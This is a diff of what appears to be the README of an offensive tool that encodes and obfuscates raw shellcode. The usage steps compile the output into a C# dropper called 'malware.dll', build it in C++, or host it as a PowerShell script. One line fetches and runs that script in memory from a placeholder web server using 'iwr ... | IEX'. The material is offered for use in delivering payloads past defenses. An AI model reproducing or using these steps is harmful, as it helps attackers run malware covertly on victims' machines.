@@ -26,22 +26,22 @@ You can do the exact opposite in C# to get your shellcode.
 <br />
 
 # For C# :
-    > Generate your RAW shellcode file<br />
-    > Use the encoder to obfuscate it : python.exe .\encode_cs.py .\payload.bin<br />
-    > Compile your C# dropper : csc.exe /target:library /platform:x64 /out:.\malware.dll .\generated_code.cs<br />
+    > Generate your RAW shellcode file
+    > Use the encoder to obfuscate it : python.exe .\encode_cs.py .\payload.bin
+    > Compile your C# dropper : csc.exe /target:library /platform:x64 /out:.\malware.dll .\generated_code.cs
 
 # For C++ :
-    > Generate your RAW shellcode file<br />
-    > Use the encoder to obfuscate it : python.exe .\encode_cpp.py .\payload.bin<br />
-    > Create a new C++ Console project in Visual Studio<br />
-    > Copy and paste the generated_code.cs content and build your project<br />
+    > Generate your RAW shellcode file
+    > Use the encoder to obfuscate it : python.exe .\encode_cpp.py .\payload.bin
+    > Create a new C++ Console project in Visual Studio
+    > Copy and paste the generated_code.cs content and build your project
 
 # For Powershell :
-    > Generate your RAW shellcode file<br />
-    > Use the encoder to obfuscate it : python.exe .\encode_psh.py .\payload.bin<br />
-    > Put your generated_code.ps1 into a web server folder<br />
-    > Open a Powershell windows on the client side and make an in-memory execution :<br />
-        iwr http://yourwebserveripaddress/generated_code.ps1 | IEX<br />
+    > Generate your RAW shellcode file
+    > Use the encoder to obfuscate it : python.exe .\encode_psh.py .\payload.bin
+    > Put your generated_code.ps1 into a web server folder
+    > Open a Powershell windows on the client side and make an in-memory execution :
+        iwr http://yourwebserveripaddress/generated_code.ps1 | IEX
 
 
 <br /><br /><br />
